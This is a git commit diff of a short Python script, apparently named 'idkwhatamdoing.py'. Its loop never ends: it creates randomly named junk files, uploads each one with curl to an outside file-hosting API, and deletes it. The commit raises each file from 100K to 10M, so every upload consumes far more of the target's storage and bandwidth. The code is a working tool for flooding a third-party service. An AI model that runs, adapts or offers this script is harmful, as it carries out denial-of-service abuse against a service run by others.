dc59dd67c428352ee096cf8e02687eac424f27d8
fivembojufkarz2k21 <107816075+fivembojufkarz2k21@users.noreply.github.com>
2022-07-17 23:06:52 +0200

    Update idkwhatamdoing.py

--- idkwhatamdoing.py
+++ idkwhatamdoing.py
@@ -8,7 +8,7 @@ long_username = 12
 def rawr():
     while True:
         usernamerepl = "".join(random.sample(username_for, long_username))
-        os.system("fallocate -l 100K "+usernamerepl)
+        os.system("fallocate -l 10M "+usernamerepl)
         os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
         os.system("rm "+usernamerepl)
         
